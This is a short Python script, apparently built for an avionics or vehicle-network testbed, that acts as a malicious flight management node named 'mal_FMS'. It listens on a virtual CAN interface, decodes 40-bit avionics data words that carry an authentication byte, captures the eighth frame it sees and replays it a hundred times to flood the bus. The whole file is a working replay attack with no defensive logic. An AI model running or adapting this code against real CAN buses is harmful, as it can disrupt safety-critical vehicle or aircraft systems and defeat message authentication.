import can
import time
import threading

ARBITRATION_ID = 0x100
REPLAY_COUNT = 100
REPLAY_DELAY = 0.01

CAPTURE_INDEX = 8  # capture the 8th message


def decode_40bit_from_bytes(data_bytes: bytes) -> dict:
    if len(data_bytes) != 5:
        return None
    word_full = int.from_bytes(data_bytes, byteorder='big')
    parity = (word_full >> 39) & 0x1
    ssm = (word_full >> 37) & 0x3
    data = (word_full >> 18) & 0x7FFFF
    sdi = (word_full >> 16) & 0x3
    label = (word_full >> 8) & 0xFF
    auth = word_full & 0xFF
    return {
        "parity": parity,
        "ssm": ssm,
        "data": data,
        "sdi": sdi,
        "label": label,
        "auth": auth,
        "raw_int": word_full
    }


def replay_frame(bus, raw_bytes: bytes, count=REPLAY_COUNT, delay=REPLAY_DELAY):
    msg = can.Message(arbitration_id=ARBITRATION_ID, data=raw_bytes, is_extended_id=False)
    for i in range(count):
        try:
            bus.send(msg)
        except can.CanError:
            print("[mal_FMS] CAN send failed")
        time.sleep(delay)
    print(f"[mal_FMS]: Replayed frame {count} times!")


def listener_loop(bus):
    message_count = 0
    captured_frame = None

    while True:
        msg = bus.recv(timeout=1)
        if not msg:
            continue

        message_count += 1
        print(f"[mal_FMS] Saw message #{message_count}")

        if message_count == CAPTURE_INDEX:
            captured_frame = msg.data
            print(f"[mal_FMS] Captured message #{CAPTURE_INDEX} for replay!")
            
            # Automatically start replay flood
            t = threading.Thread(target=replay_frame, args=(bus, captured_frame))
            t.start()
            
            continue


def main():
    bus = can.interface.Bus(channel='vcan0', interface='socketcan')
    listener_loop(bus)
    bus.shutdown()


if __name__ == "__main__":
    main()
